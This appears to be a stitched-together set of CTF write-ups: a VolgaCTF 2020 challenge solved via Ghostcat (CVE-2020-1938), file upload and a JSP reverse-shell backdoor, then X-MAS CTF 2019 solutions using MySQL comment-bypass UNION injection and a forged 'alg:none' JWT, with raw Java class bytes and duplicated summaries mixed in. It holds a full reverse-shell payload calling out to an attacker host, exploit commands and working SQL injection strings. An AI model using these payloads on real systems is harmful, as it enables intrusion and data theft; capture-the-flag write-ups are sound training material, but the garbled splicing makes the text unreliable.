x00\x10java/lang/System\x01\x00\x15Ljava/io/PrintStream;\x01\x00\x13java/io/PrintStream\x01\x00\x07println\x01\x00\x15(Ljava/lang/String;)V\x01\x00\x11getServletContext\x01\x00 ()Ljavax/servlet/ServletContext;\x01\x00\x1cjavax/servlet/ServletContext\x01\x00\x0bgetRealPath\x01\x00\x06append\x01\x00-(Ljava/lang/String;)Ljava/lang/StringBuilder;\x01\x00\x08toString\x01\x00\x14()Ljava/lang/String;\x01\x00\x06exists\x01\x00\x03()Z\x01\x00\x05mkdir\x01\x00\x0cgetParameter\x01\x00\x06equals\x01\x00\x15(Ljava/lang/Object;)Z\x01\x00\x08getParts\x01\x00\x18()Ljava/util/Collection;\x01\x00\x14java/util/Collection\x01\x00\x08iterator\x01\x00\x16()Ljava/util/Iterator;\x01\x00\x07hasNext\x01\x00\x04next\x01\x00\x14()Ljava/lang/Object;\x01\x00\x07getName\x01\x00\tseparator\x01\x00\x05write\x01\x00\tgetWriter\x01\x00\x17()Ljava/io/PrintWriter;\x01\x00\x0esetContentType\x01\x00\x14setCharacterEncoding\x01\x00\x06format\x01\x009(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;\x01\x00\x13java/io/PrintWriter\x01\x00\x05print\x01\x00\x05flush\x01\x00\x0bgetInstance\x01\x001(Ljava/lang/String;)Ljava/security/MessageDigest;\x01\x00\x08getBytes\x01\x00\x04()[B\x01\x00\x06update\x01\x00\x05([B)V\x01\x00\x06(I[B)V\x01\x00\x15(I)Ljava/lang/String;\x01\x00\x04(I)V\x01\x00\x06length\x01\x00\x03()I\x01\x00\x0fprintStackTrace\x01\x00\tgetHeader\x01\x00\x05split\x01\x00\'(Ljava/lang/String;)[Ljava/lang/String;\x01\x00\x04trim\x01\x00\nstartsWith\x01\x00\x15(Ljava/lang/String;)Z\x01\x00\x07indexOf\x01\x00\x15(Ljava/lang/String;)I\x01\x00\tsubstring\x01\x00\x16(II)Ljava/lang/String;\x00!\x00\r\x00D\x00\x00\x00\x01\x00\x1a\x00E\x00F\x00\x01\x00G\x00\x00\x00\x02\x00\x0e\x00\x06\x00\x01\x00H\x00I\x00\x01\x00J\x00\x00\x00?\x00\x02\x00\x01\x00\x00\x00\r*\xb7\x00\x01\xb2\x00\x02\x12\x03\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x1a\x00\x04\x00\x1b\x00\x0c\x00\x1c\x00L\x00\x00\x00\x0c\x00\x01\x00\x00\x00\r\x00M\x00N\x00\x00\x00\x01\x00O\x00P\x00\x02\x00J\x00\x00\x00A\x00\x02\x00\x02\x00\x00\x00\t\xb2\x00\x02\x12\x05\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\n\x00\x02\x00\x00\x00\x1f\x00\x08\x00 \x00L\x00\x00\x00\x16\x00\x02\x00\x00\x00\t\x00M\x00N\x00\x00\x00\x00\x00\t\x00Q\x00R\x00\x01\x00S\x00\x00\x00\x04\x00\x01\x00T\x00\x01\x00U\x00I\x00\x01\x00J\x00\x00\x007\x00\x02\x00\x01\x00\x00\x00\t\xb2\x00\x02\x12\x06\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\n\x00\x02\x00\x00\x00$\x00\x08\x00%\x00L\x00\x00\x00\x0c\x00\x01\x00\x00\x00\t\x00M\x00N\x00\x00\x00\x04\x00V\x00W\x00\x02\x00J\x00\x00\x02O\x00\x06\x00\x0c\x00\x00\x00\xfc+\xb9\x00\x07\x01\x00\x12\x08\xb9\x00\t\x02\x00N\xbb\x00\nY\xb7\x00\x0b-\xb6\x00\x0c\x12\x0e\xb6\x00\x0c\xb6\x00\x0f:\x04\xbb\x00\x10Y\x19\x04\xb7\x00\x11:\x05\x19\x05\xb6\x00\x12\x9a\x00\t\x19\x05\xb6\x00\x13W+\x12\x14\xb9\x00\x15\x02\x00:\x06\x19\x06\xc6\x00\r\x19\x06\x12\x16\xb6\x00\x17\x9a\x00\x03+\xb9\x00\x18\x01\x00\xb9\x00\x19\x01\x00:\x07\x19\x07\xb9\x00\x1a\x01\x00\x99\x00b\x19\x07\xb9\x00\x1b\x01\x00\xc0\x00\x1c:\x08*\x19\x08\xb7\x00\x1d:\t\xbb\x00\x10Y\x19\t\xb7\x00\x11\xb6\x00\x1e:\t*\x19\t\xb7\x00\x1f:\n\xbb\x00\nY\xb7\x00\x0b\x19\x04\xb6\x00\x0c\xb2\x00 \xb6\x00\x0c\x19\n\xb6\x00\x0c\xb6\x00\x0f:\x0b\x19\x0b\x12!\xb6\x00\x17\x99\x00\x06\xa7\xff\xa6\x19\x08\x19\x0b\xb9\x00""\x02\x00\xa7\xff\x9a,\xb9\x00#\x01\x00:\x07,\x12$\xb9\x00%\x02\x00,\x12&\xb9\x00\'\x02\x00\x19\x07\x12(\x04\xbd\x00)Y\x03\x12\x16S\xb8\x00*\xb6\x00+\x19\x07\xb6\x00,\xb1\x00\x00\x00\x03\x00K\x00\x00\x00Z\x00\x16\x00\x00\x00+\x00\x0e\x00.\x00#\x000\x00.\x001\x006\x002\x00<\x004\x00F\x005\x00U\x008\x00x\x009\x00\x80\x00;\x00\x8e\x00<\x00\x96\x00=\x00\xb2\x00>\x00\xbc\x00?\x00\xbf\x00@\x00\xc8\x00A\x00\xcb\x00C\x00\xd3\x00D\x00\xdb\x00E\x00\xe3\x00F\x00\xf6\x00G\x00\xfb\x00H\x00L\x00\x00\x00z\x00\x0c\x00\x80\x00H\x00X\x00F\x00\t\x00\x96\x002\x00Y\x00F\x00\n\x00\xb2\x00\x16\x00Z\x00F\x00\x0b\x00x\x00P\x00[\x00\\\x00\x08\x00\x00\x00\xfc\x00M\x00N\x00\x00\x00\x00\x00\xfc\x00]\x00^\x00\x01\x00\x00\x00\xfc\x00_\x00`\x00\x02\x00\x0e\x00\xee\x00a\x00F\x00\x03\x00#\x00\xd9\x00b\x00F\x00\x04\x00.\x00\xce\x00c\x00d\x00\x05\x00F\x00\xb6\x00e\x00F\x00\x06\x00\xd3\x00)\x00f\x00g\x00\x07\x00h\x00\x00\x00a\x00\x05\xfe\x00<\x07\x00i\x07\x00i\x07\x00j\xfc\x00\x18\x07\x00i\xfc\x00\x0c\x07\x00k\xff\x00\\\x00\x0c\x07\x00l\x07\x00m\x07\x00n\x07\x00i\x07\x00i\x07\x00j\x07\x00i\x07\x00k\x07\x00o\x07\x00i\x07\x00i\x07\x00i\x00\x00\xff\x00\x0b\x00\x07\x07\x00l\x07\x00m\x07\x00n\x07\x00i\x07\x00i\x07\x00j\x07\x00i\x00\x00\x00S\x00\x00\x00\x06\x00\x02\x00T\x00p\x00\x02\x00q\x00r\x00\x01\x00J\x00\x00\x01G\x00\x04\x00\x08\x00\x00\x00c\x12-\xb8\x00.M,+\xb6\x00/\xb6\x000,\xb6\x001N\xbb\x002Y\x04-\xb7\x003\x10\x10\xb6\x004:\x04\xbb\x00\nY\x10 \xb7\x005:\x05\x036\x06\x10 \x19\x04\xb6\x006d6\x07\x15\x06\x15\x07\xa2\x00\x11\x19\x05\x127\xb6\x00\x0cW\x84\x06\x01\xa7\xff\xee\x19\x05\x19\x04\xb6\x00\x0c\xb6\x00\x0f\xb0M,\xb6\x009\x12!\xb0\x00\x01\x00\x00\x00Z\x00[\x008\x00\x03\x00K\x00\x00\x002\x00\x0c\x00\x00\x00L\x00\x06\x00M\x00\x0e\x00N\x00\x13\x00O\x00#\x00P\x00.\x00R\x00B\x00S\x00J\x00R\x00P\x00V\x00[\x00X\x00\\\x00Y\x00`\x00Z\x00L\x00\x00\x00\\\x00\t\x001\x00\x1f\x00s\x00t\x00\x06\x00;\x00\x15\x00u\x00t\x00\x07\x00\x06\x00U\x00v\x00w\x00\x02\x00\x13\x00H\x00x\x00y\x00\x03\x00#\x008\x00z\x00F\x00\x04\x00.\x00-\x00{\x00|\x00\x05\x00\\\x00\x07\x00}\x00~\x00\x02\x00\x00\x00c\x00M\x00N\x00\x00\x00\x00\x00c\x00X\x00F\x00\x01\x00h\x00\x00\x000\x00\x03\xff\x00;\x00\x08\x07\x00l\x07\x00i\x07\x00\x7f\x07\x00\x80\x07\x00i\x07\x00\x81\x01\x01\x00\x00\xf9\x00\x14\xff\x00\n\x00\x02\x07\x00l\x07\x00i\x00\x01\x07\x00\x82\x00\x02\x00\x83\x00\x84\x00\x01\x00J\x00\x00\x00\xe3\x00\x04\x00\x08\x00\x00\x00U+\x12:\xb9\x00;\x02\x00M,\x12<\xb6\x00=N-:\x04\x19\x04\xbe6\x05\x036\x06\x15\x06\x15\x05\xa2\x003\x19\x04\x15\x062:\x07\x19\x07\xb6\x00>\x12?\xb6\x00@\x99\x00\x19\x19\x07\x19\x07\x12A\xb6\x00B\x05`\x19\x07\xb6\x006\x04d\xb6\x00C\xb0\x84\x06\x01\xa7\xff\xcc\x12\x08\xb0\x00\x00\x00\x03\x00K\x00\x00\x00\x1e\x00\x07\x00\x00\x00_\x00\t\x00`\x00\x10\x00a\x00)\x00b\x006\x00c\x00L\x00a\x00R\x00f\x00L\x00\x00\x004\x00\x05\x00)\x00#\x00\x85\x00F\x00\x07\x00\x00\x00U\x00M\x00N\x00\x00\x00\x00\x00U\x00[\x00\\\x00\x01\x00\t\x00L\x00\x86\x00F\x00\x02\x00\x10\x00E\x00\x87\x00\x88\x00\x03\x00h\x00\x00\x00\x1e\x00\x03\xff\x00\x1b\x00\x07\x07\x00l\x07\x00o\x07\x00i\x07\x00\x89\x07\x00\x89\x01\x01\x00\x000\xf8\x00\x05\x00\x02\x00\x8a\x00\x00\x00\x02\x00\x8b\x00\x8c\x00\x00\x00\x06\x00\x01\x00\x8d\x00\x00')

create_class_file(""ServeComplaintServlet"", b'\xca\xfe\xba\xbe\x00\x00\x004\x00>\n\x00\x08\x00+\t\x00,\x00-\x08\x00.\n\x00/\x000\x08\x001\x08\x002\x07\x003\x07\x004\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x08SAVE_DIR\x01\x00\x12Ljava/lang/String;\x08\x005\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00+Lru/volgactf/netcorp/ServeComplaintServlet;\x01\x00\x04init\x01\x00 (Ljavax/servlet/ServletConfig;)V\x01\x00\x06config\x01\x00\x1dLjavax/servlet/ServletConfig;\x01\x00\nExceptions\x07\x006\x01\x00\x07destroy\x01\x00\x05doGet\x01\x00R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V\x01\x00\x07request\x01\x00\'Ljavax/servlet/http/HttpServletRequest;\x01\x00\x08response\x01\x00(Ljavax/servlet/http/HttpServletResponse;\x07\x007\x01\x00\x06doPost\x01\x00\nSourceFile\x01\x00\x1aServeComplaintServlet.java\x01\x00\x19RuntimeVisibleAnnotations\x01\x00*Ljavax/servlet/annotation/MultipartConfig;\x0c\x00\x11\x00\x12\x07\x008\x0c\x009\x00:\x01\x00*ServeScreenshotServlet Constructor called!\x07\x00;\x0c\x00<\x00=\x01\x00+ServeScreenshotServlet ""Init"" method called\x01\x00.ServeScreenshotServlet ""Destroy"" method called\x01\x00)ru/volgactf/netcorp/ServeComplaintServlet\x01\x00\x1ejavax/servlet/http/HttpServlet\x01\x00\x07uploads\x01\x00\x1ejavax/servlet/ServletException\x01\x00\x13java/io/IOException\x01\x00\x10java/lang/System\x01\x00\x03out\x01\x00\x15Ljava/io/PrintStream;\x01\x00\x13java/io/PrintStream\x01\x00\x07println\x01\x00\x15(Ljava/lang/String;)V\x00!\x00\x07\x00\x08\x00\x00\x00\x02\x00\x1a\x00\t\x00\n\x00\x01\x00\x0b\x00\x00\x00\x02\x00\x0c\x00\x1a\x00\x0e\x00\x0f\x00\x01\x00\x0b\x00\x00\x00\x02\x00\x10\x00\x05\x00\x01\x00\x11\x00\x12\x00\x01\x00\x13\x00\x00\x00?\x00\x02\x00\x01\x00\x00\x00\r*\xb7\x00\x01\xb2\x00\x02\x12\x03\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x15\x00\x04\x00\x16\x00\x0c\x00\x17\x00\x15\x00\x00\x00\x0c\x00\x01\x00\x00\x00\r\x00\x16\x00\x17\x00\x00\x00\x01\x00\x18\x00\x19\x00\x02\x00\x13\x00\x00\x00A\x00\x02\x00\x02\x00\x00\x00\t\xb2\x00\x02\x12\x05\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\n\x00\x02\x00\x00\x00\x1b\x00\x08\x00\x1c\x00\x15\x00\x00\x00\x16\x00\x02\x00\x00\x00\t\x00\x16\x00\x17\x00\x00\x00\x00\x00\t\x00\x1a\x00\x1b\x00\x01\x00\x1c\x00\x00\x00\x04\x00\x01\x00\x1d\x00\x01\x00\x1e\x00\x12\x00\x01\x00\x13\x00\x00\x007\x00\x02\x00\x01\x00\x00\x00\t\xb2\x00\x02\x12\x06\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\n\x00\x02\x00\x00\x00 \x00\x08\x00!\x00\x15\x00\x00\x00\x0c\x00\x01\x00\x00\x00\t\x00\x16\x00\x17\x00\x00\x00\x04\x00\x1f\x00 \x00\x02\x00\x13\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x06\x00\x01\x00\x00\x00\'\x00\x15\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x16\x00\x17\x00\x00\x00\x00\x00\x01\x00!\x00""\x00\x01\x00\x00\x00\x01\x00#\x00$\x00\x02\x00\x1c\x00\x00\x00\x06\x00\x02\x00\x1d\x00%\x00\x04\x00&\x00 \x00\x02\x00\x13\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x06\x00\x01\x00\x00\x00,\x00\x15\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x16\x00\x17\x00\x00\x00\x00\x00\x01\x00!\x00""\x00\x01\x00\x00\x00\x01\x00#\x00$\x00\x02\x00\x1c\x00\x00\x00\x06\x00\x02\x00\x1d\x00%\x00\x02\x00\'\x00\x00\x00\x02\x00(\x00)\x00\x00\x00\x06\x00\x01\x00*\x00\x00')
```

Now files can be decompiled to analyze them:
* [`ServeScreenshotServlet.class`](ServeScreenshotServlet.class);
* [`ServeComplaintServlet.class`](ServeComplaintServlet.class).

The interesting one is `ServeScreenshotServlet.class`.

```java
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String appPath = request.getServletContext().getRealPath("""");

    
    String savePath = appPath + ""uploads"";
    
    File fileSaveDir = new File(savePath);
    if (!fileSaveDir.exists()) {
      fileSaveDir.mkdir();
    }
    String submut = request.getParameter(""submit"");
    if (submut == null || !submut.equals(""true""));

    
    for (Part part : request.getParts()) {
      String fileName = extractFileName(part);
      
      fileName = (new File(fileName)).getName();
      String hashedFileName = generateFileName(fileName);
      String path = savePath + File.separator + hashedFileName;
      if (path.equals(""Error""))
        continue; 
      part.write(path);
    } 
    
    PrintWriter out = response.getWriter();
    response.setContentType(""application/json"");
    response.setCharacterEncoding(""UTF-8"");
    out.print(String.format(""{'success':'%s'}"", new Object[] { ""true"" }));
    out.flush();
  }
  
  private String generateFileName(String fileName) {
    try {
      MessageDigest md = MessageDigest.getInstance(""MD5"");
      md.update(fileName.getBytes());
      byte[] digest = md.digest();
      String s2 = (new BigInteger(true, digest)).toString(16);
      StringBuilder sb = new StringBuilder(32);
      
      for (int i = 0, count = 32 - s2.length(); i < count; i++) {
        sb.append(""0"");
      }
      
      return sb.append(s2).toString();
    }
    catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
      return ""Error"";
    } 
  }
```

The `ServeScreenshotServlet` contains a file upload functionality via HTTP POST request. The file is stored under `/uploads/` subdirectory with an hashed `fileName`.

You can use a pure Java [backdoor.jsp](backdoor.jsp) file to execute commands on the remote host.

```jsp
<%
java.lang.String host=""x.x.x.x"";
int port=1337;
java.lang.String[] cmd={""commands"", ""here""};
java.lang.Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50L);try {p.exitValue();break;}catch (java.lang.Exception e){}};p.destroy();s.close();
%>
```

The file can be uploaded with the following. command.

```
root@m3ss4p0:~# curl -F 'data=@backdoor.jsp' -X POST http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot
{'success':'true'}
```

The name of the page will be the MD5 hash of the original name.

```
root@m3ss4p0:~# curl -X GET http://netcorp.q.2020.volgactf.ru:7782/uploads/76fd18e7cd6f88d7ae8591ed08ea6fbb
<%
java.lang.String host=""x.x.x.x"";
int port=1337;
java.lang.String[] cmd={""commands"", ""here""};
java.lang.Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50L);try {p.exitValue();break;}catch (java.lang.Exception e){}};p.destroy();s.close();
%>
```

A listening server can be set up with `nc -lvkp 1337`.

The execution can be triggered with the exploit.

```
root@m3ss4p0:~/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/76fd18e7cd6f88d7ae8591ed08ea6fbb eval

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Set-Cookie: JSESSIONID=969DC9D72D7FBE51D6A6909922B94662; Path=/; HttpOnly
[<] Content-Type: text/html;charset=ISO-8859-1
[<] Content-Length: 1
```

Launching the attack with `java.lang.String[] cmd={""ls""};` into the backdoor file will give you the following.

```
user@listening-server:~$ nc -lvkp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from bahilovopt.ru 49794 received!
BUILDING.txt
CONTRIBUTING.md
LICENSE
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
bin
conf
flag.txt
lib
logs
temp
webapps
work
```

Launching the attack with `java.lang.String[] cmd={""cat"", ""flag.txt""};` into the backdoor file will give you the flag.

```
user@listening-server:~$ nc -lvkp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from bahilovopt.ru 41004 received!
VolgaCTF{qualification_unites_and_real_awesome_nothing_though_i_need_else}
```","After doing some recon, you can discover that the application server is an old Apache Tomcat installation. In particular, trying to reach a URL will spawn an error containing the version: `Apache Tomcat/9.0.24`.

This version is affected of Ghostcat vulnerability (CVE-2020-1938)].

For this vulnerability, several public exploits exist. One of them is Ajp Shooter.

You can checkout and use it to read `web.xml` file.

At this point, you can discover that two servlets exist.

You can easily get both `.class` files using the exploit.

I wrote a Python script to recover the files, but the tool has a parameter to save read file.

Now files can be decompiled to analyze them.

The `ServeScreenshotServlet` contains a file upload functionality via HTTP POST request. The file is stored under `/uploads/` subdirectory with an hashed `fileName`.

You can use a pure Java backdoor.jsp file to execute commands on the remote host.

The name of the page will be the MD5 hash of the original name.

A listening server can be set up with `nc -lvkp 1337`.

The execution can be triggered with the exploit.

Launching the attack with into the backdoor file will give you the flag."
"# X-MAS CTF 2019 – Execute No Evil

* **Category:** web
* **Points:** 50

## Challenge

> (1) New Message: ""Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. Don't worry, I made the query so that it responds with boss's profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. Anyway, guess we'll go with this til' the sysadmin comes and fixes the issue.""
>
> Huh, so hear no evil, see no evil, ... execute no evil?
>
> Remote server: http://challs.xmas.htsp.ro:11002
>
> Author: Milkdrop

## Solution

Analyzing the HTML source coude you can discover an interesting comment.

```html
<head>
	<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>
<body>
<form class=""center"">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type=""text"" name=""name"" autocomplete=""off"">
	<input type=""submit"" value=""Search"">
</form>
<br>
<!-- ?source=1 -->


</body>
```

So, connecting to `http://challs.xmas.htsp.ro:11002/?source=1` you can print the PHP source code.

```php
<?php
if (isset ($_GET['source'])) {
    show_source (""index.php"");
    die ();
}
?>

<head>
    <link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>
<body>
<form class=""center"">
    <h2>Cobalt Inc. employee database search</h2>
    <label>Name:</label>
    <input type=""text"" name=""name"" autocomplete=""off"">
    <input type=""submit"" value=""Search"">
</form>
<br>
<!-- ?source=1 -->

<?php
include (""config.php"");
$conn = new mysqli ($servername, $username, $password, $dbname);

if (isset ($_GET['name'])) {
    $name = $_GET['name'];
    $name = str_replace (""*"", """", $name);
    $records = mysqli_query ($conn, ""SELECT * FROM users WHERE name=/*"" . $name . ""*/ 'Geronimo'"", MYSQLI_USE_RESULT); // Don't tell boss

    if ($records === false) {
        die (""<p>Our servers have run into a query error. Please try again later.</p>"");
    }

    echo '<table>';
    echo '
    <tr>
        <th>Name</th>
        <th>Description</th>
    </tr>';

    while ($row = mysqli_fetch_array ($records, MYSQLI_ASSOC)) {
        echo '<tr>
            <td>',$row[""name""],'</td>
            <td>',$row[""description""],'</td>
        </tr>';
    }

    echo '</table>';
}
?>

</body>
```

Even if the `$name` variable is concatenated inside a MySQL comment, the code is still vulnerable to SQL injection, because MySQL can execute query portions inside comments.

From [https://www.owasp.org/index.php/Testing_for_MySQL](https://www.owasp.org/index.php/Testing_for_MySQL):

> Fingerprinting MySQL
>
> Of course, the first thing to know is if there's MySQL DBMS as a back end database. MySQL server has a feature that is used to let other DBMS ignore a clause in MySQL dialect. When a comment block ('/**/') contains an exclamation mark ('/*! sql here*/') it is interpreted by MySQL, and is considered as a normal comment block by other DBMS as explained in MySQL manual.
> 
> Example:
>
> 1 /*! and 1=0 */
> 
> Result Expected:
>
> If MySQL is present, the clause inside the comment block will be interpreted.

The base to perform SQL injection is the following.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION <malicious payload> UNION SELECT 'foo', name, description FROM users WHERE name =
```

First of all you could try to enumerate DB tables.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT 'foo', table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' UNION SELECT 'foo', name, description FROM users WHERE name =
```

And you will discover that a `flag` table exists.

```html
<head>
	<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>
<body>
<form class=""center"">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type=""text"" name=""name"" autocomplete=""off"">
	<input type=""submit"" value=""Search"">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>ctf</td>
			<td>users</td>
		</tr><tr>
			<td>ctf</td>
			<td>flag</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

Then you can enumerate table columns.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 'flag' UNION SELECT 'foo', name, description FROM users WHERE name =
```

And you can discover that a column called `whatsthis` exists.

```html
<head>
	<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>
<body>
<form class=""center"">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type=""text"" name=""name"" autocomplete=""off"">
	<input type=""submit"" value=""Search"">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>flag</td>
			<td>whatsthis</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

And now you can print the content of the table.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT 'foo', 'bar', whatsthis FROM flag UNION SELECT 'foo', name, description FROM users WHERE name =
```

The content of the table will reveal the flag.

```html
<head>
	<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>
<body>
<form class=""center"">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type=""text"" name=""name"" autocomplete=""off"">
	<input type=""submit"" value=""Search"">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>bar</td>
			<td>X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

The flag is the following.

```
X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}
```","Analyzing the HTML source coude you can discover an interesting endpoint from which you can print the PHP source code.

Even if the `$name` variable is concatenated inside a MySQL comment, the code is still vulnerable to SQL injection, because MySQL can execute query portions inside comments.

First of all you could try to enumerate DB tables.

And you will discover that a `flag` table exists.

Then you can enumerate table columns.

And you can discover that a column called `whatsthis` exists.

And now you can print the content of the table.

The content of the table will reveal the flag."
"# X-MAS CTF 2019 – Mercenary Hat Factory

* **Category:** web
* **Points:** 424 

## Challenge

> ""Mmph Mmmmph Mmph Mmmph!""
> Translation: Come and visit our hat factory!
> 
> Files: [server.py](server.py)
>
> Remote server: http://challs.xmas.htsp.ro:11005
>
> Author: Milkdrop

## Solution

Registering a user and analyzing cookies you will find a cookie called `auth` containing a JWT.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJtM3NzYXAwIn0.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY

{""typ"":""JWT"",""alg"":""HS256""}.{""type"":""user"",""user"":""m3ssap0""}.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY
```

You can check its creation inside `register` and `login` methods of the source code [server.py](server.py).

Analyzing the source code you can discover two interesting endpoints:
* `/makehat` for which you have to be an authorized admin;
* `/authorize` that can let you to become an authorized admin, but there are some restrictions.

Considering the presence of template rendering operations into `/makehat` endpoint with a parameter read from the user, i.e. `hatName`, probably that functionality is vulnerable to *Server Side Template Injection* (*SSTI*) due to the insecure usage of *Flask/Jinja2* template engine.

The first check to bypass for the `/authorize` endpoint is the following.

```python
            if (userData[""type""] != ""admin""):
                return render_template (""error.html"", error = ""Unauthorized."")
```

This can be easily bypassed forging a JWT like the following and testing that you are an admin connecting to the root of the website.

```
{""typ"":""JWT"",""alg"":""none""}.{""type"":""admin"",""user"":""m3ssap0""}.

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
```

Checking it to the index endpoint.

```
GET / HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 17 Dec 2019 14:11:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 736
Connection: close

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/logout"">Logout</a>

</div>
	<div class=""container"">
		
			<h1>Welcome <span style=""color: #A1FF44"">m3ssap0</span>!</h1>
			
				
					<div>You are a Level 1 factory administrator. Here is your factory jam:<br><br>
					<iframe width=""879"" height=""468"" src=""https://www.youtube.com/embed/aj1yZ19WuM0"" frameborder=""0"" allow=""accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"" allowfullscreen></iframe>
				
				</div>
				<img class=""companion"" src=""/static/img/balloonicorn.png"">
			
		
	</div>
	<script src=""/static/js/snow.js""></script>
</body>
```

At this point you have to break this check.

```python
                if (request.form.get ('accessCode') == str (uid) + usr + pss + userpss):
                    authorizedAdmin [userData [""user""]] = True
```

